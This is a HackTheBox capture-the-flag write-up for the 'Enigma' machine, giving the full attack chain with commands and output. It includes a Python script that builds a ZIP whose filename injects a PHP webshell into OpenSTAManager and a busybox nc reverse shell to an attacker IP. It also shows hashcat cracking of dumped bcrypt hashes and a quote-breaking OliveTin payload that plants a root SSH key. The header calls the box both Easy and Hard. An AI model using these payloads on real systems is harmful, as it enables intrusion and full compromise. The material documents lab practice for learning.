# HTB — Enigma Writeup

> **Date:** October 20, 2026  
> **Platform:** HackTheBox  
> **Difficulty:** Easy  
> **Target IP:** `10.129.239.191`  
> **Category:** Linux / Web Application Penetration Testing  
> **Tags:** `Writeups` `Linux` `HTB` `Hard` `NFS` `IMAP` `OpenSTAManager` `GHSA-25fp-8w8p-mx36` `RCE` `OliveTin` `PrivEsc`

---

![Enigma Banner](assets/images/enigma1.jpeg)

Welcome to the **Enigma** walkthrough on HackTheBox! **Enigma** is a multi-service Linux machine ranked as **Hard** difficulty that presents a realistic, interconnected attack chain. Compromising the box involves chaining an exposed NFS wildcard share, credential harvesting via IMAP email access, exploiting a ZIP path traversal and command injection vulnerability in OpenSTAManager (`CVE-GHSA-25fp-8w8p-mx36`) to obtain a `www-data` foothold, pivoting to user `haris` through a cracked MySQL bcrypt hash, and ultimately escalating to `root` via an unsanitized template injection in an internal `OliveTin` management daemon.

---

## 1. Reconnaissance & Enumeration

### 1.1 Port Scan (Nmap)

We initiate reconnaissance with an aggressive full TCP port scan against the target:

```bash
nmap -sC -sV -p- 10.129.239.191
```

The scan identifies several interesting listening services, including standard remote management, web, mail, and network file sharing ports:

| Port | Service | Version | Description / Notes |
| :--- | :--- | :--- | :--- |
| **22/tcp** | SSH | OpenSSH 9.6p1 | Secure Shell remote access |
| **80/tcp** | HTTP | nginx 1.24.0 | Web server fronting internal web applications |
| **110/tcp / 995/tcp** | POP3 / POP3S | Dovecot | Mail retrieval service |
| **111/tcp** | rpcbind | 2-4 (RPC #100000) | RPC portmapper service |
| **143/tcp / 993/tcp** | IMAP / IMAPS | Dovecot | Mail access service |
| **2049/tcp** | NFS | nfs_acl | Network File System share |

---

### 1.2 NFS Enumeration & Credential Leakage

With port 2049 exposed, we query the NFS mount points using `showmount`:

```bash
showmount -e 10.129.239.191
```

**Output:**

```text
Export list for 10.129.239.191:
/srv/nfs/onboarding *
```

The export `/srv/nfs/onboarding` is configured with a wildcard (`*`), allowing any host to mount it. We create a local mount directory and attach the remote share:

```bash
mkdir -p /tmp/nfs && mount -t nfs 10.129.239.191:/srv/nfs/onboarding /tmp/nfs
```

Inspecting the contents of the mounted share uncovers an onboarding document containing leaked employee credentials:

```text
kevin : Enigma2024!
```

> [!NOTE]
> Testing these credentials against the SSH daemon fails for `kevin`, indicating either SSH login is restricted or the user does not have interactive shell access.

---

### 1.3 Mail Service Access (IMAP) & Credential Harvesting

Since the machine exposes Dovecot IMAP and POP3 services, we test the discovered password (`Enigma2024!`) across known employee accounts to check for password reuse.

Attempting authentication against IMAPS (port 993) for employee `sarah` succeeds:

```bash
openssl s_client -connect mail001.enigma.htb:993 -crlf
```

```text
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] Dovecot ready.
A001 LOGIN sarah Enigma2024!
A001 OK [CAPABILITY IMAP4rev1 ...] Logged in
A002 SELECT INBOX
* 1 EXISTS
* 1 RECENT
* OK [UNSEEN 1] First unseen.
A003 FETCH 1 BODY[TEXT]
```

Reading the welcome email in Sarah's inbox exposes credentials for an internal support portal:

| Field | Value |
| :--- | :--- |
| **URL** | `http://support_001.enigma.htb` |
| **Username** | `admin` |
| **Password** | `Ne3s4rtars78s` |

We add `support_001.enigma.htb` and `mail001.enigma.htb` to `/etc/hosts`:

```bash
echo "10.129.239.191 support_001.enigma.htb mail001.enigma.htb" | sudo tee -a /etc/hosts
```

---

## 2. Web Exploitation — OpenSTAManager RCE

### 2.1 Application Fingerprinting

Navigating to `http://support_001.enigma.htb` loads a login portal for **OpenSTAManager**, an open-source Italian ERP / support ticketing suite, located at `/var/www/html/openstamanager/`.

We authenticate into the administrative dashboard using the credentials found in the email:
- **Username:** `admin`
- **Password:** `Ne3s4rtars78s`

---

### 2.2 Vulnerability Analysis — GHSA-25fp-8w8p-mx36

Security research into the installed version of OpenSTAManager reveals a known vulnerability tracked under **GHSA-25fp-8w8p-mx36** / CVE advisory:
- **Reference:** [GitHub Advisory Database — GHSA-25fp-8w8p-mx36](https://github.com/advisories/GHSA-25fp-8w8p-mx36)
- **Vulnerable Component:** `importFE_ZIP` plugin
- **Mechanism:** The plugin accepts a ZIP archive upload and passes the uploaded file's original name directly into a PHP `exec()` system call without sanitization or parameter binding, enabling arbitrary command injection via crafted archive names.

---

### 2.3 Malicious ZIP Crafting & Payload Execution

We construct a malicious ZIP archive whose filename embeds our command injection payload. The injection closes the expected command string and appends arbitrary shell commands:

```python
import zipfile

cmd = "echo '<?php system($_GET[\"c\"]); ?>' > /var/www/html/openstamanager/files/SHELL.php"
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile("exploit.zip", "w") as z:
    z.writestr(malicious_filename, "dummy invoice data")
```

Upon uploading `exploit.zip` through the vulnerable `importFE_ZIP` plugin, the backend executes the injected shell command, successfully dropping a PHP webshell into the web-accessible `files/` directory:

```bash
curl -s "http://support_001.enigma.htb/files/SHELL.php?c=id"
```

**Response:**

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We verify access by reading `/etc/passwd`:

```bash
curl -s "http://support_001.enigma.htb/files/SHELL.php?c=cat%20/etc/passwd"
```

---

### 2.4 Spawning & Upgrading an Interactive Shell

We start a Netcat listener on our attack machine:

```bash
nc -lvnp 4444
```

We then trigger an interactive reverse shell using BusyBox `nc`:

```bash
curl "http://support_001.enigma.htb/files/SHELL.php?c=busybox%20nc%2010.10.17.52%204444%20-e%20/bin/bash"
```

Once connected, we upgrade to a full pseudo-terminal:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z to background the process
stty raw -echo; fg
```

---

## 3. Local Reconnaissance & Lateral Movement

### 3.1 System Users & Permissions

Inspecting `/etc/passwd` highlights user accounts:
- **`root`** (UID 0) — Superuser
- **`haris`** (UID 1000) — Interactive normal user
- Non-interactive / service accounts: `kevin`, `sarah`, `it`, `www-data`

Our current context is `www-data`.

---

### 3.2 Database Credentials Discovery

We inspect the OpenSTAManager database configuration file at `/var/www/html/openstamanager/config.inc.php`:

```bash
cat /var/www/html/openstamanager/config.inc.php
```

```php
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
```

- **User:** `brollin`
- **Password:** `Fri3nds@9099`
- **Database:** `openstamanager`

---

### 3.3 Database Dump — zz_users

Using the harvested credentials, we query the `openstamanager` database and dump the application's user table (`zz_users`):

```bash
mysql -u brollin -p'Fri3nds@9099' openstamanager -e "SELECT id, username, password FROM zz_users;"
```

| ID | Username | Password Hash (bcrypt) |
| :---: | :--- | :--- |
| `1` | `admin` | `$2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu` |
| `2` | `haris` | `$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC` |

We also notice a Roundcube Webmail database instance with credentials:
- **User:** `roundcube`
- **Password:** `Yo270x26!gTx02`

---

### 3.4 Internal Service Discovery (OliveTin)

We check for local listening ports and background daemons:

```bash
ss -tulpn
```

```text
Netid  State   Recv-Q  Send-Q    Local Address:Port   Peer Address:Port  Process
tcp    LISTEN  0       128       127.0.0.1:1337              0.0.0.0:*
```

Port `1337` is bound exclusively to `127.0.0.1`. Checking running processes reveals an **OliveTin** service executing as `root`:

```bash
ps aux | grep OliveTin
```

```text
root  892  0.0  1.2  721940  24816 ?  Ssl  04:12  0:01 /usr/local/bin/OliveTin
```

Inspecting OliveTin's configuration file at `/etc/OliveTin/config.yaml`:

```yaml
actions:
  - title: Backup Database
    id: backup_database
    shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
    arguments:
      - name: db_user
        type: ascii_identifier
        default: backup_svc
      - name: db_pass
        type: password
      - name: db_name
        type: ascii_identifier
        default: production
```

---

### 3.5 Bcrypt Hash Cracking & SSH Access (haris)

We copy `haris`'s bcrypt hash to our attack machine and run Hashcat using `rockyou.txt`:

```bash
hashcat -m 3200 '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' /usr/share/wordlists/rockyou.txt
```

The hash cracks in seconds:

```text
$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends
```

- **Credentials:** `haris : bestfriends`

We authenticate as `haris` via `su` or SSH:

```bash
su - haris
# Password: bestfriends
```

We locate and read the user flag:

```bash
find / -name "user.txt" 2>/dev/null
cat /home/haris/user.txt
```

---

## 4. Privilege Escalation — OliveTin Command Injection

### 4.1 Vulnerability Root Cause Analysis

OliveTin executes commands specified in the `shell:` directive using `/bin/sh -c`, performing raw string template interpolation instead of parameterized command execution.

Looking at the action configuration:
- `db_user` and `db_name` are constrained by `type: ascii_identifier`, which strictly limits input to alphanumeric characters.
- In contrast, `db_pass` is specified as `type: password`, which **does not enforce any input validation or escaping**. It accepts quotes, shell metacharacters, semicolons, and pipes.

Because `db_pass` is interpolated into:
```bash
mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql
```
Injecting a closing single quote (`'`) allows us to escape the parameter and append arbitrary commands that execute with the privileges of the OliveTin daemon (`root`).

---

### 4.2 Reaching OliveTin via SSH Port Forward

OliveTin's REST API and web UI listen strictly on `127.0.0.1:1337`. Direct HTTP requests from low-privileged local shells can be finicky, so we leverage our SSH access as `haris` to set up local port forwarding:

1. Copy our Kali SSH public key:
   ```bash
   cat ~/.ssh/id_ed25519.pub
   ```

2. On the target machine (as `haris`):
   ```bash
   mkdir -p /home/haris/.ssh && chmod 700 /home/haris/.ssh
   echo "ssh-ed25519 AAAA... kali@kali" >> /home/haris/.ssh/authorized_keys
   chmod 600 /home/haris/.ssh/authorized_keys
   ```

3. From Kali, forward local port `1337` to target's `127.0.0.1:1337`:
   ```bash
   ssh -i ~/.ssh/id_ed25519 -L 1337:127.0.0.1:1337 haris@10.129.239.191
   ```

Now, navigating to `http://127.0.0.1:1337` on Kali connects directly to the root-owned OliveTin service.

---

### 4.3 Triggering the Action via REST API

OliveTin exposes an action execution endpoint at `/api/StartAction`. We construct a JSON payload targeting the `backup_database` action:

```json
{
  "actionId": "backup_database",
  "arguments": [
    { "name": "db_user", "value": "backup_svc" },
    { "name": "db_pass", "value": "PAYLOAD_HERE" },
    { "name": "db_name", "value": "production" }
  ]
}
```

We send the request via `curl`:

```bash
curl -m 5 -X POST http://127.0.0.1:1337/api/StartAction \
  -H "Content-Type: application/json" \
  -d @/tmp/payload.json
```

---

### 4.4 The 3-Second Execution Timeout Pitfall

> [!WARNING]
> **Execution Timeout Constraint:**  
> OliveTin enforces a strict default **3-second execution timeout** on shell actions. Any long-lived blocking process—such as a traditional interactive reverse shell (`bash -i >& /dev/tcp/...` or `python3 pty`)—is immediately terminated with `SIGKILL` once the 3-second window expires, severing the connection before a stable session can be established.

To reliably defeat this constraint, the payload must complete its execution **instantaneously** (sub-second) rather than maintaining an open socket.

---

### 4.5 Root Escalation — Instant SSH Public Key Drop

The ideal payload injects our Kali public SSH key directly into `/root/.ssh/authorized_keys`. This executes in milliseconds and gives permanent, reliable root access over SSH without being impacted by the 3-second timeout.

Our crafted `db_pass` value:

```text
pass' || mkdir -p /root/.ssh && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDY4PfPCO8O02E4i9PlprwqcB3CsIxJpVzLkZKfh44hO" >> /root/.ssh/authorized_keys || '
```

When interpolated into the shell command, the daemon executes:

```bash
mysqldump -u backup_svc -p'pass' || mkdir -p /root/.ssh && echo "ssh-ed25519 AAA..." >> /root/.ssh/authorized_keys || '' production > /opt/backups/backup.sql
```

We save the final payload to `/tmp/payload.json`:

```bash
cat << 'EOF' > /tmp/payload.json
{
  "actionId": "backup_database",
  "arguments": [
    { "name": "db_user", "value": "backup_svc" },
    { "name": "db_pass", "value": "pass' || mkdir -p /root/.ssh && echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDY4PfPCO8O02E4i9PlprwqcB3CsIxJpVzLkZKfh44hO\" >> /root/.ssh/authorized_keys || '" },
    { "name": "db_name", "value": "production" }
  ]
}
EOF
```

We trigger the action via `curl`:

```bash
curl -m 5 -X POST http://127.0.0.1:1337/api/StartAction \
  -H "Content-Type: application/json" \
  -d @/tmp/payload.json
```

---

### 4.6 Capturing the Root Flag

With our SSH public key written to `/root/.ssh/authorized_keys`, we authenticate directly into the machine as `root`:

```bash
ssh -i ~/.ssh/id_ed25519 root@10.129.239.191
```

```text
root@enigma:~# id
uid=0(root) gid=0(root) groups=0(root)

root@enigma:~# cat /root/root.txt
```

Root access achieved! 🏁

---

## 5. Credentials Summary

| Source | Username | Password / Hash | Purpose |
| :--- | :--- | :--- | :--- |
| **NFS Share** (`/srv/nfs/onboarding`) | `kevin` | `Enigma2024!` | Leaked employee password; reused for `sarah` |
| **IMAP Email** (`mail001.enigma.htb`) | `admin` | `Ne3s4rtars78s` | Administrative credentials for OpenSTAManager |
| **App Config** (`config.inc.php`) | `brollin` | `Fri3nds@9099` | Local MySQL database credentials |
| **MySQL DB** (`zz_users`) | `haris` | `$2y$10$WHf1T79sxjsZ...` | User bcrypt hash (cracked to `bestfriends`) |
| **MySQL DB** (Roundcube) | `roundcube` | `Yo270x26!gTx02` | Internal webmail database credentials |
| **Hashcat Crack** | `haris` | `bestfriends` | Interactive SSH / `su` access (`user.txt`) |
| **OliveTin Injection** | `root` | `(SSH Key Drop)` | Root shell access via `/root/.ssh/authorized_keys` |

---

## 6. Attack Chain Flow

<div style="background: rgba(15, 23, 42, 0.7); border: 1px solid rgba(56, 189, 248, 0.25); border-radius: 16px; padding: 2rem 1.5rem 2rem 1.5rem; margin: 2rem 0; box-shadow: 0 20px 40px -15px rgba(0, 0, 0, 0.5);">
  <div style="position: relative; padding-left: 2.25rem;">
    <div style="position: absolute; left: 0.85rem; top: 0.5rem; bottom: 0.5rem; width: 3px; background: linear-gradient(180deg, #38bdf8 0%, #f59e0b 25%, #c084fc 50%, #34d399 75%, #ef4444 100%); border-radius: 3px; box-shadow: 0 0 12px rgba(56, 189, 248, 0.4);"></div>
    <div style="display: flex; flex-direction: column; gap: 1.5rem;">
      <div style="position: relative;">
        <div style="position: absolute; left: -2.25rem; top: 0.2rem; width: 24px; height: 24px; border-radius: 50%; background: #0f172a; border: 2px solid #38bdf8; color: #38bdf8; display: flex; align-items: center; justify-content: center; font-size: 0.65rem; font-weight: 700; font-family: monospace; box-shadow: 0 0 10px rgba(56, 189, 248, 0.6);">01</div>
        <div style="background: rgba(30, 41, 59, 0.6); border: 1px solid rgba(56, 189, 248, 0.2); border-radius: 10px; padding: 0.85rem 1.15rem; text-align: center;">
          <div style="color: #38bdf8; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.25rem; text-align: center;">Phase 1 · Reconnaissance</div>
          <div style="color: #f8fafc; font-size: 0.95rem; font-weight: 500; text-align: center;">Nmap Port Scan identified SSH, HTTP, POP3/IMAP, and NFS (2049)</div>
        </div>
      </div>
      <div style="position: relative;">
        <div style="position: absolute; left: -2.25rem; top: 0.2rem; width: 24px; height: 24px; border-radius: 50%; background: #0f172a; border: 2px solid #38bdf8; color: #38bdf8; display: flex; align-items: center; justify-content: center; font-size: 0.65rem; font-weight: 700; font-family: monospace; box-shadow: 0 0 10px rgba(56, 189, 248, 0.6);">02</div>
        <div style="background: rgba(30, 41, 59, 0.6); border: 1px solid rgba(56, 189, 248, 0.2); border-radius: 10px; padding: 0.85rem 1.15rem; text-align: center;">
          <div style="color: #38bdf8; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.25rem; text-align: center;">Phase 1 · NFS Enumeration</div>
          <div style="color: #f8fafc; font-size: 0.95rem; font-weight: 500; text-align: center;">Mounted wildcard export /srv/nfs/onboarding → Harvested kevin:Enigma2024!</div>
        </div>
      </div>
      <div style="position: relative;">
        <div style="position: absolute; left: -2.25rem; top: 0.2rem; width: 24px; height: 24px; border-radius: 50%; background: #0f172a; border: 2px solid #f59e0b; color: #f59e0b; display: flex; align-items: center; justify-content: center; font-size: 0.65rem; font-weight: 700; font-family: monospace; box-shadow: 0 0 10px rgba(245, 158, 11, 0.6);">03</div>
        <div style="background: rgba(30, 41, 59, 0.6); border: 1px solid rgba(245, 158, 11, 0.2); border-radius: 10px; padding: 0.85rem 1.15rem; text-align: center;">
          <div style="color: #f59e0b; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.25rem; text-align: center;">Phase 1 · Credential Reuse</div>
          <div style="color: #f8fafc; font-size: 0.95rem; font-weight: 500; text-align: center;">Password reuse on IMAP (sarah) → Found admin:Ne3s4rtars78s for support portal</div>
        </div>
      </div>
      <div style="position: relative;">
        <div style="position: absolute; left: -2.25rem; top: 0.2rem; width: 24px; height: 24px; border-radius: 50%; background: #0f172a; border: 2px solid #f59e0b; color: #f59e0b; display: flex; align-items: center; justify-content: center; font-size: 0.65rem; font-weight: 700; font-family: monospace; box-shadow: 0 0 10px rgba(245, 158, 11, 0.6);">04</div>
        <div style="background: rgba(30, 41, 59, 0.6); border: 1px solid rgba(245, 158, 11, 0.2); border-radius: 10px; padding: 0.85rem 1.15rem; text-align: center;">
          <div style="color: #f59e0b; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.25rem; text-align: center;">Phase 2 · Web RCE Exploitation</div>
          <div style="color: #f8fafc; font-size: 0.95rem; font-weight: 500; text-align: center;">GHSA-25fp-8w8p-mx36 ZIP filename traversal injection in OpenSTAManager</div>
        </div>
      </div>
      <div style="position: relative;">
        <div style="position: absolute; left: -2.25rem; top: 0.2rem; width: 24px; height: 24px; border-radius: 50%; background: #0f172a; border: 2px solid #c084fc; color: #c084fc; display: flex; align-items: center; justify-content: center; font-size: 0.65rem; font-weight: 700; font-family: monospace; box-shadow: 0 0 10px rgba(192, 132, 252, 0.6);">05</div>
        <div style="background: rgba(30, 41, 59, 0.6); border: 1px solid rgba(192, 132, 252, 0.2); border-radius: 10px; padding: 0.85rem 1.15rem; text-align: center;">
          <div style="color: #c084fc; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.25rem; text-align: center;">Phase 2 · Webshell &amp; Foothold</div>
          <div style="color: #f8fafc; font-size: 0.95rem; font-weight: 500; text-align: center;">Dropped PHP webshell in files/ → Spawned interactive shell as www-data</div>
        </div>
      </div>
      <div style="position: relative;">
        <div style="position: absolute; left: -2.25rem; top: 0.2rem; width: 24px; height: 24px; border-radius: 50%; background: #0f172a; border: 2px solid #c084fc; color: #c084fc; display: flex; align-items: center; justify-content: center; font-size: 0.65rem; font-weight: 700; font-family: monospace; box-shadow: 0 0 10px rgba(192, 132, 252, 0.6);">06</div>
        <div style="background: rgba(30, 41, 59, 0.6); border: 1px solid rgba(192, 132, 252, 0.2); border-radius: 10px; padding: 0.85rem 1.15rem; text-align: center;">
          <div style="color: #c084fc; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.25rem; text-align: center;">Phase 3 · Database Extraction</div>
          <div style="color: #f8fafc; font-size: 0.95rem; font-weight: 500; text-align: center;">Read config.inc.php (brollin) → Dumped zz_users bcrypt hashes</div>
        </div>
      </div>
      <div style="position: relative;">
        <div style="position: absolute; left: -2.25rem; top: 0.2rem; width: 24px; height: 24px; border-radius: 50%; background: #0f172a; border: 2px solid #34d399; color: #34d399; display: flex; align-items: center; justify-content: center; font-size: 0.65rem; font-weight: 700; font-family: monospace; box-shadow: 0 0 10px rgba(52, 211, 153, 0.6);">07</div>
        <div style="background: rgba(30, 41, 59, 0.6); border: 1px solid rgba(52, 211, 153, 0.2); border-radius: 10px; padding: 0.85rem 1.15rem; text-align: center;">
          <div style="color: #34d399; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.25rem; text-align: center;">Phase 3 · Lateral Movement</div>
          <div style="color: #f8fafc; font-size: 0.95rem; font-weight: 500; text-align: center;">Cracked bcrypt hash → haris:bestfriends → SSH shell &amp; captured user.txt</div>
        </div>
      </div>
      <div style="position: relative;">
        <div style="position: absolute; left: -2.25rem; top: 0.2rem; width: 24px; height: 24px; border-radius: 50%; background: #0f172a; border: 2px solid #ef4444; color: #ef4444; display: flex; align-items: center; justify-content: center; font-size: 0.65rem; font-weight: 700; font-family: monospace; box-shadow: 0 0 10px rgba(239, 68, 68, 0.6);">08</div>
        <div style="background: rgba(30, 41, 59, 0.6); border: 1px solid rgba(239, 68, 68, 0.2); border-radius: 10px; padding: 0.85rem 1.15rem; text-align: center;">
          <div style="color: #ef4444; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.25rem; text-align: center;">Phase 4 · Internal Tunneling</div>
          <div style="color: #f8fafc; font-size: 0.95rem; font-weight: 500; text-align: center;">Forwarded root-owned OliveTin daemon (127.0.0.1:1337) over SSH</div>
        </div>
      </div>
      <div style="position: relative;">
        <div style="position: absolute; left: -2.25rem; top: 0.2rem; width: 24px; height: 24px; border-radius: 50%; background: #0f172a; border: 2px solid #ef4444; color: #ef4444; display: flex; align-items: center; justify-content: center; font-size: 0.65rem; font-weight: 700; font-family: monospace; box-shadow: 0 0 10px rgba(239, 68, 68, 0.6);">09</div>
        <div style="background: rgba(30, 41, 59, 0.6); border: 1px solid rgba(239, 68, 68, 0.2); border-radius: 10px; padding: 0.85rem 1.15rem; text-align: center;">
          <div style="color: #ef4444; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.25rem; text-align: center;">Phase 5 · OliveTin Command Injection</div>
          <div style="color: #f8fafc; font-size: 0.95rem; font-weight: 500; text-align: center;">Unsanitized db_pass template injection in backup_database action</div>
        </div>
      </div>
      <div style="position: relative;">
        <div style="position: absolute; left: -2.25rem; top: 0.2rem; width: 24px; height: 24px; border-radius: 50%; background: #0f172a; border: 2px solid #ef4444; color: #ef4444; display: flex; align-items: center; justify-content: center; font-size: 0.65rem; font-weight: 700; font-family: monospace; box-shadow: 0 0 10px rgba(239, 68, 68, 0.6);">10</div>
        <div style="background: rgba(30, 41, 59, 0.6); border: 1px solid rgba(239, 68, 68, 0.2); border-radius: 10px; padding: 0.85rem 1.15rem; text-align: center;">
          <div style="color: #ef4444; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.25rem; text-align: center;">Phase 5 · Instant Root Escalation</div>
          <div style="color: #f8fafc; font-size: 0.95rem; font-weight: 500; text-align: center;">Bypassed 3s execution timeout with SSH key injection → Captured root.txt 🏁</div>
        </div>
      </div>
    </div>
  </div>
</div>

---
